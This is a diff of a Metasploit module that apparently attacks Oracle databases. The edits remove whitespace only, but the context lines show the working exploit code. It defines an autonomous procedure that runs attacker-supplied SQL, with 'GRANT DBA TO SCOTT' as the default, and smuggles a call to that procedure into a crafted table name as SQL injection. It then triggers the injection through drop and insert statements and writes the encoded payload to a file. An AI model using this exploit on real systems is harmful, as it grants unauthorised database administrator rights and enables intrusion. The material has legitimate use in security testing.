@@ -36,13 +36,13 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Jan 13 2009'))
 
-			register_options( 
+			register_options(
 				[
 					OptString.new('SQL',      [ false, 'The SQL to execute.',  'GRANT DBA TO SCOTT']),
 					OptString.new('USER',      [ false, 'The current user. ',  'SCOTT']),
 					OptString.new('FILENAME', [ false, 'The file name.',  'msf.sql']),
 					OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
-				
+
 				], self.class)
 	end
 
@@ -58,8 +58,8 @@ class Metasploit3 < Msf::Auxiliary
 		function1 = %Q|
 			CREATE OR REPLACE PROCEDURE #{name1}
 			AUTHID CURRENT_USER AS
-			PRAGMA AUTONOMOUS_TRANSACTION; 
-			BEGIN EXECUTE IMMEDIATE '#{datastore['SQL']}'; 
+			PRAGMA AUTONOMOUS_TRANSACTION;
+			BEGIN EXECUTE IMMEDIATE '#{datastore['SQL']}';
 			END;
 			|
 
@@ -78,17 +78,17 @@ class Metasploit3 < Msf::Auxiliary
 			|
 
 		prepare ="create table \"O' and 1=#{datastore['USER']}.#{name2}--\"(id number)"
-		
+
 		exploiting1 ="drop table \"O' and 1=#{datastore['USER']}.#{name2}--\""
-		
+
 		exploiting2 = "insert into system.DEF$_TEMP$LOB (TEMP$BLOB) VALUES ('AA')"
-		
+
 		fun1  = Rex::Text.encode_base64(function1)
 		fun2 = Rex::Text.encode_base64(function2)
 		prp  = Rex::Text.encode_base64(prepare)
 		exp1 = Rex::Text.encode_base64(exploiting1)
 		exp2 = Rex::Text.encode_base64(exploiting2)
-		
+
 
 		sql = %Q|
 			DECLARE
@@ -117,10 +117,10 @@ class Metasploit3 < Msf::Auxiliary
 			|
 
 
-		print_status("Creating '#{datastore['FILENAME']}' file ...")		
+		print_status("Creating '#{datastore['FILENAME']}' file ...")
 		file_create(sql)
 
 
 	end
 
-end 
+end
